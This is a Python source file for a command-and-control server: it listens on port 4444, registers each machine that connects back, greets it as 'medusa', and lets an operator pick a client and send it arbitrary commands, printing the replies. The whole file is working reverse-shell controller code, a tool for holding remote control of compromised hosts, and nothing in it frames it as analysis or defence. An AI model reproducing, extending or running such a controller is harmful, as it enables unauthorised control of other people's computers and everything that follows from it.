import socket
import threading
from colorama import init, Fore, Style

init(autoreset=True)

clients = {}
lock = threading.Lock()
current_client_id = None

def handle_client(conn, addr, client_id):
    print(Fore.GREEN + f"[+] {client_id} connected from {addr}")
    conn.send(b'Connected to medusa\n')
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            print(Fore.CYAN + f"[{client_id}] " + Style.RESET_ALL + data.decode(errors='ignore'))
        except:
            break
    with lock:
        del clients[client_id]
    conn.close()
    print(Fore.RED + f"[-] {client_id} disconnected")

def accept_connections(server):
    client_counter = 0
    while True:
        conn, addr = server.accept()
        with lock:
            client_id = f"Client{client_counter}"
            clients[client_id] = conn
            client_counter += 1
        threading.Thread(target=handle_client, args=(conn, addr, client_id), daemon=True).start()

def command_loop():
    global current_client_id
    while True:
        cmd = input(Fore.YELLOW + "tv> " + Style.RESET_ALL).strip()
        if cmd.startswith("rc"):
            print(Fore.BLUE + "Available clients:")
            for cid in clients:
                print(f" - {cid}")
            target = input("Select client: ").strip()
            if target in clients:
                current_client_id = target
                print(Fore.MAGENTA + f"Now controlling: {current_client_id}")
            else:
                print(Fore.RED + "Invalid client ID.")
        elif current_client_id and current_client_id in clients:
            if cmd == "exit":
                current_client_id = None
            else:
                try:
                    clients[current_client_id].send(cmd.encode())
                except:
                    print(Fore.RED + "Failed to send command.")
        else:
            print(Fore.RED + "No client selected. Use 'rc'.")

def main():
    host = "0.0.0.0"
    port = 4444
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(Fore.GREEN + f"[+] Server listening on {host}:{port}")
    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
    command_loop()

if __name__ == "__main__":
    main()
